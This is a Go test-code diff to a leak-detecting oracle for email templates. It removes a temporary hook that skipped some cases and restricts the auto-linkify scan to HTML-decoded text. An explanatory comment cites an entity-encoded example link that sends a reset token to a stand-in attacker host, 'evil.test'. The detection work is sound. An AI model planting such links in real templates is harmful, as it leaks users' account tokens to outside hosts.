@@ -195,9 +195,6 @@ func assertNoSecretReachesAFetch(t *testing.T, src, bodyName string, branded boo
 		if oracleRunHost(site.value) == oracleLinkHost {
 			continue
 		}
-		if tmpKnownGap(site.value) {
-			continue
-		}
 		for _, secret := range []struct{ what, mark string }{
 			{"the live reset or verification token", oracleTokenV},
 			{"the live one-time code", oracleCodeV},
@@ -311,18 +308,29 @@ func textFetchSites(text string) []fetchSite {
 	if text == "" {
 		return nil
 	}
-	forms := []string{text}
-	if decoded := decodeHTMLEntities(text); decoded != text {
-		forms = append(forms, decoded)
-	}
-	var sites []fetchSite
-	for _, form := range forms {
-		for _, run := range oracleLinkRuns(form) {
-			sites = append(sites, fetchSite{
-				where: "a run of text a mail client auto-linkifies",
-				value: run,
-			})
-		}
+	// The decoded form only, because that is the text the recipient's client
+	// linkifies: it parses the HTML, resolves the character references, and runs
+	// its linkifier over what it is about to display.
+	//
+	// Reading the raw form as well looked stricter and was only wrong. Decoding
+	// can introduce a character that terminates a URL, and when it does, the raw
+	// form is a link the client never sees: "//0&lt;0{{.Token}}" is one
+	// uninterrupted run before decoding and two harmless fragments after it,
+	// because the recipient sees "//0<0TOKEN" and every linkifier stops at the
+	// "<". The fuzzer reported it as a leak, and it is not one -- there is no
+	// attacker host in it, only the token standing where a host would go.
+	//
+	// The reverse direction is what actually matters and is covered: an entity
+	// that decodes *into* a link ("https&#58;//evil.test/?t={{.Token}}") is not a
+	// run before decoding and is one after, so checking the decoded form is what
+	// catches it. Skipping the raw form can therefore lose no leak.
+	runs := oracleLinkRuns(decodeHTMLEntities(text))
+	sites := make([]fetchSite, 0, len(runs))
+	for _, run := range runs {
+		sites = append(sites, fetchSite{
+			where: "a run of text a mail client auto-linkifies",
+			value: run,
+		})
 	}
 	return sites
 }
@@ -538,17 +546,4 @@ func oracleScanAttrValue(doc string, i int) (string, int) {
 // case-sensitive search would read a beacon built from it as clean.
 func containsFold(s, substr string) bool {
 	return indexFold(s, substr) >= 0
-}
-
-// TEMPORARY exploration hook, removed before hand-off.
-func tmpKnownGap(v string) bool {
-	if !strings.HasPrefix(v, "//") {
-		return false
-	}
-	for _, m := range []string{oracleTokenV, oracleCodeV, oracleLinkMark} {
-		if indexFold(v, m) == 2 {
-			return true
-		}
-	}
-	return false
 }
